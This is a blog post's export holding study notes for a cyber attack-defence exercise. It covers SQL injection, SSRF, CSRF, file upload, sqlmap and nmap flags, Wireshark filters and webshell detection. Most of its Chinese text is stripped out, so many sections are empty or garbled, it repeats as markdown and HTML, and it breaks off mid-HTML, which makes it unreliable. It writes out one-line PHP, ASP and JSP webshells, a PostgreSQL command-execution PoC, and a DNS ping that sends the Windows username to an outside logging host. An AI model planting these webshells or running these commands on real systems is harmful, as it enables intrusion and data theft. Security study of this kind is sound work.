\n\n### pdfxxe\n\nPDF  XXEXML  PDF  XML  PDF  XML \n\n\n\n### httpmethoddata\n\n\t\t\nGET\t\t\nHEAD\t\t\nPOST\t\t\nPUT\t\t\nTRACE\t\t\nOPTIONS\t\t\nDELETE\t\t\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### sql\n\n- SQL\n- SQL //WAF\n-  \\select\n-  \n-  \n- \n\n\n\n### \n\n\n\n### \n\n\n\n### DNS\n\n- sql\n\n- XSS\n\n- \n\n- windows\n\n  ping %USERNAME%.XXX.CEYE.IO\n\n- xxe\n\n- ssrf\n\n\n\n### \n\n\n\n\n\n### socket\n\n>  Websocket  bufferedAmount \n>\n> 1. Client  Websocket  Server \n> 2. Server  connect  TCP  window size  0 Client  server\n> 3. Client  websocket.send()\n> 4.  Client  websocket.bufferedAmount \n>     TCP  Client \n\n\n\n### \n\n```\n<?php @eval($_POST[1]);?>    php\n<%eval request(\"chopper\")%>   asp\n <%Process process = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>  jsp\n\n```\n\n\n\n### \n\n-  \n- \n\n\n\n### fastjson\n\n\n\n### \n\n\n\n### \n\nIIS\n\n- \n- put\n- \n\napache\n\n- \n- addhandler\n- \n\nnginx\n\n- \n- \n- \n- \n\ntomcat\n\n- \n- \n- +getshell\n\njboss\n\n- \n- \n\n### ngsoc\n\nNGSOC\n\n\n\n### \n\n\n\n### windowslinux\n\nlinuxdebian linux\n\n\n\n### \n\n2017\n\nWindowsSMB 139445\n\n\n\n### sql\n\nload_file() into outfile / into dumpfile\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### \n\nGBKGBK\n\nmysqlGBKASCII128\n\n\n\n### \n\nvpnShadowsocksTrojanWireGuard\n\n\n\n### \n\nApache StrutsRDPSSH\n\n\n\n\n\n\n\n\n\n### \n\n1. \n2. \n3. HTTP\n4. \n\n\n\n\n\n### sql\n\n- SQL\n- SQL //WAF\n-  \\select\n-  \n-  \n- \n\n\n\n### ngsoc\n\nNGSOC\n\n\n\n### \n\n-  (  0x00  IIS6.0  )\n\n-  (  ),  :  .\n\n-  MIME (  GIF  MIME image/gif,CSS  MIME text/css  ) 3.  (  webshell)\n\n-  (  ,  )\n\n-  (  ,  webshell  )\n\n- \n\n\n\n### xff\n\nx-forwarded-for HTTPIP\n\nsql\n\n\n\n### sql\n\n- web\n- \n- sql\n- secure_file_privFile_priv\n\n\n\n### sqlmap\n\n```\n-h                  \n-hh                 \n-v                  0~61\n-u url              url\n--data=DATA         POST\n-r file.txt         POST\n-p / --skip         /\n--cookie            cookie\n--force-ssl         SSL\n--threads           \n--prefix            \n--suffix            \n--level             1~51\n--risk              1~41\n--all               \n--banner            \n--current-user      \n--current-db        \n--hostname          \n--is-dba            \n--users             \n--dbs               \n-D DB               \n--tables            -D\n-T table            -D\n--columns           -D -T\n-C column           -D -T\n--dump              \n--dump-all          \n--count             \n--search            -D -T-C \n--sql-query         SQL\n--sql-shell         SQL\n--flie-read         \n--file-write        \n--file-dest         \n--os-cmd            \n--os-shell          shell\n--batch             \n--wizard            \n```\n\n\n\n\n\n### csrf\n\n\n\nCSRF  :\n\n       1 .  A cookie\n    \n       2 .  A  cookie  B (B A)\n    \n       3 .  A  CSRF \n\n****\n\nCSRFRefererCSRF\n\n\n\n****\n\n1.  HTTP Referer \n2.  token \n3.  HTTP \n4. Chrome  SameSite cookie\n\n\n\n### ssrf\n\n(Server-Side Request Forgery),SSRF\n\n\n\n1web\n\n2\n\n380,443,8080,8090\n\n4httphttpsfile:///,gopher://,ftp://\n\n5DNSHost\n\n\n\n### \n\nWatering Hole Attack\n\n\n\n1    \n\n2    \n\n3    \n\n\n\n### \n\n\n\n### tomcat\n\njsp html htm js css xml gif jpg png pdf doc xls\n\n### ssrf\n\nhttp https ftp smtp dns file \n\n\n\n### mysql\n\n\n\n### nmap\n\n- -sS (TCP SYN)root TCPSYN \n- -sT SYNTCP Connect()TCPtcp connect()SYN\n- -sP pingNmappingNmap\n- -sU UDPUDP\n- -sA  open() open|filtered()) \n- -sV \n- -Pn pingping\n- -v \n- -p 1-6553514331352280\n- -O \n- -O --osscan-limit \n- -O --osscan-guess NmapNmap \n- -A \n- -oN/-oX/-oG XMLgrepable \n- -iL -iL C:\\ip.txt\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### \n\n- \n-  IP \n- \n-  SQL XSS \n- \n- \n- \n\n\n\n###                                                                                                      \n\nTianEye Log Query Syntax\n\n1. 202241430\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n IP  192.168.1.100 \n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100\n```\n\n IP  192.168.1.100202241430\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100 access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n HTTP  10  IP \n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | top 10 client_ip\n```\n\n HTTP  10  IP \n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | \n```\n\n### \n\n\n\n1. \n2. \n3. \n4. \n\n\n\n### 0day\n\n\n\n### \n\n1.  Windows \n2. \n3.  Windows Active DirectoryDNS\n4.  Windows \n\n### webshell\n\n- WebshellWebshell\n- Webshelleval(base64_decode(WebshellWebshell\n- WebshellWebshell\n- WebshellWebshell\n- WebshellWebshell\n\n\n\n### \n\n- 89 ldap \n  LdapBrowser\n- 1433 Mssql\n  getshellSA\n\n- 1521 Oracle\n  /\n\n- 3306 MySQL\n  webshelludfmof\n\n- 5432  PostgreSQL\n  postgresPoC DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM id; SELECT * FROM cmd_exec;\n\n- 5984 CouchDB\n  http://:5984/_utils\n\n- 6379 Redis\n  webshell shellrootRCE\n\n- 9200 elasticsearch\n\n### ip\n\n1. \n2. \n3. \n4. \n5. \n\n### ip114.114.114.11453\n\n\n\n### exe\n\n1. \n2. \n3. \n4. \n5. \n\n### \n\n1. \n2. \n3. \n4. \n5. \n6. \n\n\n\n### cs\n\n\n\nhttps://blog.csdn.net/zzwwhhpp/article/details/111773395\n\n\n\n### wireshark\n\nip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n\n\n\nip.addr eq 192.168.1.107 // IPIP\n\n\n\ntcp.port eq 80 // \n\ntcp.port == 80\n\ntcp.port eq 2722\n\ntcp.port eq 80 or udp.port eq 80\n\ntcp.dstport == 80 // tcp80\n\ntcp.srcport == 80 // tcp80\n\n udp.port eq 15000\n\n \n\ntcp.port >= 1 and tcp.port <= 80\n\n\n\n\nth.dst == A0:00:00:04:C5:84 // mac\n\neth.src eq A0:00:00:04:C5:84 // mac\n\neth.dst==A0:00:00:04:C5:84\n\neth.dst==A0-00-00-04-C5-84\n\neth.addr eq A0:00:00:04:C5:84 // MACMACA0:00:00:04:C5:84\n\n\n\nhttp.request.method == GET\n\nhttp.request.method == POST\n\nhttp.request.uri == /img/logo-edu.gif\n\nhttp contains GET\n\nhttp contains HTTP/1.\n\n\n\n### shiro\n\n1.1.3 \n\nApache ShiroRememberMecookiecookiekeyRememberMecookieAESBase64cookie\n\nShiroCookie\n\n### \n\n1. user-agent  antsword xxx\n\n 2.URLini_set(\"display_errors\",\"0\");\n\n\n\n### \n\n- \n- \n- 2017WannaCry445\n- \n- U\n\n### log4j\n\nlog4jJNDIRCE\n\n\n\n### wireshark\n\n\n\n### redis mongodb\n\nredis 6379   \n\nmongoDB 27017\n\n\n\n### \n\n\n\n### \n\n\n\n### struct2\n\nStruts2action:redirect:redirectAction:OgnlURLOgnlURLJava\n\n\n\n### : x.X.x.x,win7win8\n\n\n\n### \n\n\n\n### sql\n\n\n\n### \n\n\n\n### php\n\n**system()passthru()exec()pcntl_exec()shell_exec()popen()/proc_popen() ``**\n\n\n\n### \n\nAccept: application/json, text/javascript, */*; q=0.01\n\nContent-type: Application/x-www-form-urlencoded\n\n10User-Agent,shell\n\nwebshelljavawtcp49700\n\n$post=Decrypt(file_get_contents(\"php://input\"));\n\n\n\n### \n\nAccepttext/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\ncookie\n\nbase64rawbase64base64base64\n\n32md5base64md5+base64+md5\nmd50123456789ABCDEF(?i:[0-9A-F]{16})[\\w+/]{4,}=?=?(?i:[0-9A-F]{16})md5JAVAwebshellPHP\n\n\n\n### \n\n/var/log/\n\n\n\n### \n\n\n\n1. \n2. \n3. \n4. \n5. \n6. \n\nJavaJava Security ManagerJava\n\n\n\n### urlSQL\n\nSQLSQL\n\n\n\n###  \n\n\n\n1. IP\n2. \n3. \n4. \n5. \n\n\n\n1. \n2. \n3. WAF\n\n\n\n\n\n### linux\n\nLinux\n\n1. /tmpLinux\n2. /var/tmp/tmp\n3. /dev/shmramfs/dev/shm\n\nApache/var/cache/httpdNginx/var/run/nginx/client_body_temp\n\n\n\n\n\n### sql\n\nSQL\n\n1. \n2. SQL\n3. SQL\n4. \n5. SQL\n\nSQLWAF","source":"_posts/HW prepare.md","raw":"---\ntitle: HW prepare\ndate: 2023-04-12 21:20:31\nexcerpt: HW prepare\ncategories: \n---\n\n# HW prepare\n\n### hw\n\n\n\nhw\n\n\n\n### hw\n\nWAFIPS7*24\n\n\n\nIP\n\n\n\n\n\n### \n\n- \n- DDDOS\n- GLBLLBSLBGLBLLBSLB\n- WAF[web](https://cloud.tencent.com/product/waf?from=20065&from_column=20065)WEB\n- \n- [](https://cloud.tencent.com/product/vds?from=20065&from_column=20065)WEB\n- WAFwebWEB\n- \n- ICT\n\n### \n\n### pdfxxe\n\nPDF  XXEXML  PDF  XML  PDF  XML \n\n\n\n### httpmethoddata\n\n\t\t\nGET\t\t\nHEAD\t\t\nPOST\t\t\nPUT\t\t\nTRACE\t\t\nOPTIONS\t\t\nDELETE\t\t\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### sql\n\n- SQL\n- SQL //WAF\n-  \\select\n-  \n-  \n- \n\n\n\n### \n\n\n\n### \n\n\n\n### DNS\n\n- sql\n\n- XSS\n\n- \n\n- windows\n\n  ping %USERNAME%.XXX.CEYE.IO\n\n- xxe\n\n- ssrf\n\n\n\n### \n\n\n\n\n\n### socket\n\n>  Websocket  bufferedAmount \n>\n> 1. Client  Websocket  Server \n> 2. Server  connect  TCP  window size  0 Client  server\n> 3. Client  websocket.send()\n> 4.  Client  websocket.bufferedAmount \n>     TCP  Client \n\n\n\n### \n\n```\n<?php @eval($_POST[1]);?>    php\n<%eval request(\"chopper\")%>   asp\n <%Process process = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>  jsp\n\n```\n\n\n\n### \n\n-  \n- \n\n\n\n### fastjson\n\n\n\n### \n\n\n\n### \n\nIIS\n\n- \n- put\n- \n\napache\n\n- \n- addhandler\n- \n\nnginx\n\n- \n- \n- \n- \n\ntomcat\n\n- \n- \n- +getshell\n\njboss\n\n- \n- \n\n### ngsoc\n\nNGSOC\n\n\n\n### \n\n\n\n### windowslinux\n\nlinuxdebian linux\n\n\n\n### \n\n2017\n\nWindowsSMB 139445\n\n\n\n### sql\n\nload_file() into outfile / into dumpfile\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### \n\nGBKGBK\n\nmysqlGBKASCII128\n\n\n\n### \n\nvpnShadowsocksTrojanWireGuard\n\n\n\n### \n\nApache StrutsRDPSSH\n\n\n\n\n\n\n\n\n\n### \n\n1. \n2. \n3. HTTP\n4. \n\n\n\n\n\n### sql\n\n- SQL\n- SQL //WAF\n-  \\select\n-  \n-  \n- \n\n\n\n### ngsoc\n\nNGSOC\n\n\n\n### \n\n-  (  0x00  IIS6.0  )\n\n-  (  ),  :  .\n\n-  MIME (  GIF  MIME image/gif,CSS  MIME text/css  ) 3.  (  webshell)\n\n-  (  ,  )\n\n-  (  ,  webshell  )\n\n- \n\n\n\n### xff\n\nx-forwarded-for HTTPIP\n\nsql\n\n\n\n### sql\n\n- web\n- \n- sql\n- secure_file_privFile_priv\n\n\n\n### sqlmap\n\n```\n-h                  \n-hh                 \n-v                  0~61\n-u url              url\n--data=DATA         POST\n-r file.txt         POST\n-p / --skip         /\n--cookie            cookie\n--force-ssl         SSL\n--threads           \n--prefix            \n--suffix            \n--level             1~51\n--risk              1~41\n--all               \n--banner            \n--current-user      \n--current-db        \n--hostname          \n--is-dba            \n--users             \n--dbs               \n-D DB               \n--tables            -D\n-T table            -D\n--columns           -D -T\n-C column           -D -T\n--dump              \n--dump-all          \n--count             \n--search            -D -T-C \n--sql-query         SQL\n--sql-shell         SQL\n--flie-read         \n--file-write        \n--file-dest         \n--os-cmd            \n--os-shell          shell\n--batch             \n--wizard            \n```\n\n\n\n\n\n### csrf\n\n\n\nCSRF  :\n\n       1 .  A cookie\n    \n       2 .  A  cookie  B (B A)\n    \n       3 .  A  CSRF \n\n****\n\nCSRFRefererCSRF\n\n\n\n****\n\n1.  HTTP Referer \n2.  token \n3.  HTTP \n4. Chrome  SameSite cookie\n\n\n\n### ssrf\n\n(Server-Side Request Forgery),SSRF\n\n\n\n1web\n\n2\n\n380,443,8080,8090\n\n4httphttpsfile:///,gopher://,ftp://\n\n5DNSHost\n\n\n\n### \n\nWatering Hole Attack\n\n\n\n1    \n\n2    \n\n3    \n\n\n\n### \n\n\n\n### tomcat\n\njsp html htm js css xml gif jpg png pdf doc xls\n\n### ssrf\n\nhttp https ftp smtp dns file \n\n\n\n### mysql\n\n\n\n### nmap\n\n- -sS (TCP SYN)root TCPSYN \n- -sT SYNTCP Connect()TCPtcp connect()SYN\n- -sP pingNmappingNmap\n- -sU UDPUDP\n- -sA  open() open|filtered()) \n- -sV \n- -Pn pingping\n- -v \n- -p 1-6553514331352280\n- -O \n- -O --osscan-limit \n- -O --osscan-guess NmapNmap \n- -A \n- -oN/-oX/-oG XMLgrepable \n- -iL -iL C:\\ip.txt\n\n\n\n### \n\n\n\n\n\n### \n\n\n\n### \n\n- \n-  IP \n- \n-  SQL XSS \n- \n- \n- \n\n\n\n###                                                                                                      \n\nTianEye Log Query Syntax\n\n1. 202241430\n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n IP  192.168.1.100 \n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100\n```\n\n IP  192.168.1.100202241430\n\n```\nindex=xxx sourcetype=yyy client_ip=192.168.1.100 access_time>=2022-04-01 access_time<=2022-04-30\n```\n\n HTTP  10  IP \n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | top 10 client_ip\n```\n\n HTTP  10  IP \n\n```\nindex=xxx sourcetype=yyy access_time>=2022-04-01 access_time<=2022-04-30 | \n```\n\n### \n\n\n\n1. \n2. \n3. \n4. \n\n\n\n### 0day\n\n\n\n### \n\n1.  Windows \n2. \n3.  Windows Active DirectoryDNS\n4.  Windows \n\n### webshell\n\n- WebshellWebshell\n- Webshelleval(base64_decode(WebshellWebshell\n- WebshellWebshell\n- WebshellWebshell\n- WebshellWebshell\n\n\n\n### \n\n- 89 ldap \n  LdapBrowser\n- 1433 Mssql\n  getshellSA\n\n- 1521 Oracle\n  /\n\n- 3306 MySQL\n  webshelludfmof\n\n- 5432  PostgreSQL\n  postgresPoC DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM id; SELECT * FROM cmd_exec;\n\n- 5984 CouchDB\n  http://:5984/_utils\n\n- 6379 Redis\n  webshell shellrootRCE\n\n- 9200 elasticsearch\n\n### ip\n\n1. \n2. \n3. \n4. \n5. \n\n### ip114.114.114.11453\n\n\n\n### exe\n\n1. \n2. \n3. \n4. \n5. \n\n### \n\n1. \n2. \n3. \n4. \n5. \n6. \n\n\n\n### cs\n\n\n\nhttps://blog.csdn.net/zzwwhhpp/article/details/111773395\n\n\n\n### wireshark\n\nip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n\n\n\nip.addr eq 192.168.1.107 // IPIP\n\n\n\ntcp.port eq 80 // \n\ntcp.port == 80\n\ntcp.port eq 2722\n\ntcp.port eq 80 or udp.port eq 80\n\ntcp.dstport == 80 // tcp80\n\ntcp.srcport == 80 // tcp80\n\n udp.port eq 15000\n\n \n\ntcp.port >= 1 and tcp.port <= 80\n\n\n\n\nth.dst == A0:00:00:04:C5:84 // mac\n\neth.src eq A0:00:00:04:C5:84 // mac\n\neth.dst==A0:00:00:04:C5:84\n\neth.dst==A0-00-00-04-C5-84\n\neth.addr eq A0:00:00:04:C5:84 // MACMACA0:00:00:04:C5:84\n\n\n\nhttp.request.method == GET\n\nhttp.request.method == POST\n\nhttp.request.uri == /img/logo-edu.gif\n\nhttp contains GET\n\nhttp contains HTTP/1.\n\n\n\n### shiro\n\n1.1.3 \n\nApache ShiroRememberMecookiecookiekeyRememberMecookieAESBase64cookie\n\nShiroCookie\n\n### \n\n1. user-agent  antsword xxx\n\n 2.URLini_set(\"display_errors\",\"0\");\n\n\n\n### \n\n- \n- \n- 2017WannaCry445\n- \n- U\n\n### log4j\n\nlog4jJNDIRCE\n\n\n\n### wireshark\n\n\n\n### redis mongodb\n\nredis 6379   \n\nmongoDB 27017\n\n\n\n### \n\n\n\n### \n\n\n\n### struct2\n\nStruts2action:redirect:redirectAction:OgnlURLOgnlURLJava\n\n\n\n### : x.X.x.x,win7win8\n\n\n\n### \n\n\n\n### sql\n\n\n\n### \n\n\n\n### php\n\n**system()passthru()exec()pcntl_exec()shell_exec()popen()/proc_popen() ``**\n\n\n\n### \n\nAccept: application/json, text/javascript, */*; q=0.01\n\nContent-type: Application/x-www-form-urlencoded\n\n10User-Agent,shell\n\nwebshelljavawtcp49700\n\n$post=Decrypt(file_get_contents(\"php://input\"));\n\n\n\n### \n\nAccepttext/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\n\ncookie\n\nbase64rawbase64base64base64\n\n32md5base64md5+base64+md5\nmd50123456789ABCDEF(?i:[0-9A-F]{16})[\\w+/]{4,}=?=?(?i:[0-9A-F]{16})md5JAVAwebshellPHP\n\n\n\n### \n\n/var/log/\n\n\n\n### \n\n\n\n1. \n2. \n3. \n4. \n5. \n6. \n\nJavaJava Security ManagerJava\n\n\n\n### urlSQL\n\nSQLSQL\n\n\n\n###  \n\n\n\n1. IP\n2. \n3. \n4. \n5. \n\n\n\n1. \n2. \n3. WAF\n\n\n\n\n\n### linux\n\nLinux\n\n1. /tmpLinux\n2. /var/tmp/tmp\n3. /dev/shmramfs/dev/shm\n\nApache/var/cache/httpdNginx/var/run/nginx/client_body_temp\n\n\n\n\n\n### sql\n\nSQL\n\n1. \n2. SQL\n3. SQL\n4. \n5. SQL\n\nSQLWAF","slug":"HW prepare","published":1,"updated":"2024-04-17T08:43:00.255Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clv3kf7i50003h7767sr19j3y","content":"<h1 id=\"HW-prepare\"><a href=\"#HW-prepare\" class=\"headerlink\" title=\"HW prepare\"></a>HW prepare</h1><h3 id=\"hw\"><a href=\"#hw\" class=\"headerlink\" title=\"hw\"></a>hw</h3><p></p>\n<p>hw</p>\n<h3 id=\"hw\"><a href=\"#hw\" class=\"headerlink\" title=\"hw\"></a>hw</h3><p>WAFIPS7*24</p>\n<p></p>\n<p>IP</p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li></li>\n<li>DDDOS</li>\n<li>GLBLLBSLBGLBLLBSLB</li>\n<li>WAF<a class=\"link\"   href=\"https://cloud.tencent.com/product/waf?from=20065&from_column=20065\" >web<i class=\"fas fa-external-link-alt\"></i></a>WEB</li>\n<li></li>\n<li><a class=\"link\"   href=\"https://cloud.tencent.com/product/vds?from=20065&from_column=20065\" ><i class=\"fas fa-external-link-alt\"></i></a>WEB</li>\n<li>WAFwebWEB</li>\n<li></li>\n<li>ICT</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"pdfxxe\"><a href=\"#pdfxxe\" class=\"headerlink\" title=\"pdfxxe\"></a>pdfxxe</h3><p>PDF  XXEXML  PDF  XML  PDF  XML </p>\n<h3 id=\"httpmethoddata\"><a href=\"#httpmethoddata\" class=\"headerlink\" title=\"httpmethoddata\"></a>httpmethoddata</h3><p>\t\t<br>GET\t\t<br>HEAD\t\t<br>POST\t\t<br>PUT\t\t<br>TRACE\t\t<br>OPTIONS\t\t<br>DELETE\t\t</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>SQL</li>\n<li>SQL &#x2F;&#x2F;WAF</li>\n<li> \\select</li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"DNS\"><a href=\"#DNS\" class=\"headerlink\" title=\"DNS\"></a>DNS</h3><ul>\n<li><p>sql</p>\n</li>\n<li><p>XSS</p>\n</li>\n<li><p></p>\n</li>\n<li><p>windows</p>\n<p>ping %USERNAME%.XXX.CEYE.IO</p>\n</li>\n<li><p>xxe</p>\n</li>\n<li><p>ssrf</p>\n</li>\n</ul>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"socket\"><a href=\"#socket\" class=\"headerlink\" title=\"socket\"></a>socket</h3><blockquote>\n<p> Websocket  bufferedAmount </p>\n<ol>\n<li>Client  Websocket  Server </li>\n<li>Server  connect  TCP  window size  0 Client  server</li>\n<li>Client  websocket.send()</li>\n<li> Client  websocket.bufferedAmount <br> TCP  Client </li>\n</ol>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php @eval($_POST[1]);?&gt;    php</span><br><span class=\"line\">&lt;%eval request(&quot;chopper&quot;)%&gt;   asp</span><br><span class=\"line\"> &lt;%Process process = Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));%&gt;  jsp</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"fastjson\"><a href=\"#fastjson\" class=\"headerlink\" title=\"fastjson\"></a>fastjson</h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>IIS</p>\n<ul>\n<li></li>\n<li>put</li>\n<li></li>\n</ul>\n<p>apache</p>\n<ul>\n<li></li>\n<li>addhandler</li>\n<li></li>\n</ul>\n<p>nginx</p>\n<ul>\n<li></li>\n<li></li>\n<li></li>\n<li></li>\n</ul>\n<p>tomcat</p>\n<ul>\n<li></li>\n<li></li>\n<li>+getshell</li>\n</ul>\n<p>jboss</p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<h3 id=\"ngsoc\"><a href=\"#ngsoc\" class=\"headerlink\" title=\"ngsoc\"></a>ngsoc</h3><p>NGSOC</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"windowslinux\"><a href=\"#windowslinux\" class=\"headerlink\" title=\"windowslinux\"></a>windowslinux</h3><p>linuxdebian linux</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>2017</p>\n<p>WindowsSMB 139445</p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><p>load_file() into outfile &#x2F; into dumpfile</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>GBKGBK</p>\n<p>mysqlGBKASCII128</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>vpnShadowsocksTrojanWireGuard</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><p>Apache StrutsRDPSSH</p>\n<p></p>\n<p></p>\n<p></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ol>\n<li></li>\n<li></li>\n<li>HTTP</li>\n<li></li>\n</ol>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>SQL</li>\n<li>SQL &#x2F;&#x2F;WAF</li>\n<li> \\select</li>\n<li> </li>\n<li> </li>\n<li></li>\n</ul>\n<h3 id=\"ngsoc\"><a href=\"#ngsoc\" class=\"headerlink\" title=\"ngsoc\"></a>ngsoc</h3><p>NGSOC</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><ul>\n<li><p> (  0x00  IIS6.0  )</p>\n</li>\n<li><p> (  ),  :  .</p>\n</li>\n<li><p> MIME (  GIF  MIME image&#x2F;gif,CSS  MIME text&#x2F;css  ) 3.  (  webshell)</p>\n</li>\n<li><p> (  ,  )</p>\n</li>\n<li><p> (  ,  webshell  )</p>\n</li>\n<li><p></p>\n</li>\n</ul>\n<h3 id=\"xff\"><a href=\"#xff\" class=\"headerlink\" title=\"xff\"></a>xff</h3><p>x-forwarded-for HTTPIP</p>\n<p>sql</p>\n<h3 id=\"sql\"><a href=\"#sql\" class=\"headerlink\" title=\"sql\"></a>sql</h3><ul>\n<li>web</li>\n<li></li>\n<li>sql</li>\n<li>secure_file_privFile_priv</li>\n</ul>\n<h3 id=\"sqlmap\"><a href=\"#sqlmap\" class=\"headerlink\" title=\"sqlmap\"></a>sqlmap</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-h                  </span><br><span class=\"line\">-hh                 </span><br><span class=\"line\">-v                  0~61</span><br><span class=\"line\">-u url              url</span><br><span class=\"line\">--data=DATA         POST</span><br><span class=\"line\">-r file.txt         POST</span><br><span class=\"line\">-p / --skip         /</span><br><span class=\"line\">--cookie            cookie</span><br><span class=\"line\">--force-ssl         SSL</span><br><span class=\"line\">--threads           </span><br><span class=\"line\">--prefix            </span><br><span class=\"line\">--suffix            </span><br><span class=\"line\">--level             1~51</span><br><span class=\"line\">--risk              1~41</span><br><span class=\"line\">--all               </span><br><span class=\"line\">--banner            </span><br><span class=\"line\">--current-user      </span><br><span class=\"line\">--current-db        </span><br><span class=\"line\">--hostname          </span><br><span class=\"line\">--is-dba            </span><br><span class=\"line\">--users             </span><br><span class=\"line\">--dbs               </span><br><span class=\"line\">-D DB               </span><br><span class=\"line\">--tables            -D</span><br><span class=\"line\">-T table            -D</span><br><span class=\"line\">--columns           -D -T</span><br><span class=\"line\">-C column           -D -T</span><br><span class=\"line\">--dump              </span><br><span class=\"line\">--dump-all          </span><br><span class=\"line\">--count             </span><br><span class=\"line\">--search            -D -T-C </span><br><span class=\"line\">--sql-query         SQL</span><br><span class=\"line\">--sql-shell         SQL</span><br><span class=\"line\">--flie-read         </span><br><span class=\"line\">--file-write        </span><br><span class=\"line\">--file-dest         </span><br><span class=\"line\">--os-cmd            </span><br><span class=\"line\">--os-shell          shell</span><br><span class=\"line\">--batch             </span><br><span class=\"line\">--wizard            </span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h3 id=\"csrf\"><a href=\"#csrf\" class=\"headerlink\" title=\"csrf\"></a>csrf</h3><p></p>\n<p>CSRF  :</p>\n<pre><code>   1 .  A cookie\n\n   2 .  A  cookie  B (B A)\n\n   3 .  A  CSRF \n</code></pre>\n<p><strong></strong></p>\n<p>CSRFRefererCSRF</p>\n<p><strong></strong></p>\n<ol>\n<li> HTTP Referer </li>\n<li> token </li>\n<li> HTTP </li>\n<li>Chrome  SameSite cookie</li>\n</ol>\n<h3 id=\"ssrf\"><a href=\"#ssrf\" class=\"headerlink\" title=\"ssrf\"></a>ssrf</h3><p>(Server-Side 